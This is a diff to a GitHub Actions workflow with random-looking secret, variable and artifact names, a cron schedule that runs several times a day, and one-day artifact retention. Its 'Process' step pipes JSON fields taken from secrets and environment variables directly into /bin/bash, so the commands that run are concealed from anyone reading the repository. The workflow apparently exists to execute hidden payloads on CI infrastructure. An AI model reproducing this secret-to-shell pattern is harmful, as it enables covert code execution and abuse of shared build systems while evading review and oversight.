@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '39 2,8,14,20 * * *'
+    - cron: '48 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,21 +18,16 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          nvl973: ${{ secrets.nvl973 }}
+          hernv2735: ${{ secrets.hernv2735 }}
         run: |
-          printf '%s' "$nvl973" | jq -r .f9 | /bin/bash
-          echo $hxi691 | jq -r .m359 | /bin/bash
-          printf '%s' "$mu09775" | jq -r .ba10 | /bin/bash
-          echo $zja21223 | jq -r .siiqj8841 | /bin/bash
-          echo $v5750 | jq -r .lajj8 | /bin/bash
-          printf '%s' "$fsqd5464" | jq -r .sq5 | /bin/bash
-          printf '%s' "$z3" | jq -r .yllgp4339 | /bin/bash
-          echo $pj59 | jq -r .flclc6 | /bin/bash
+          printf '%s' "$hernv2735" | jq -r .ef04 | /bin/bash
+          echo $vs46 | jq -r .zzoj874 | /bin/bash
+          echo $rjmyt0 | jq -r .oq670 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: o86KMRTS
+          name: BgCdCgrv
           path: "*.zip"
           retention-days: 1
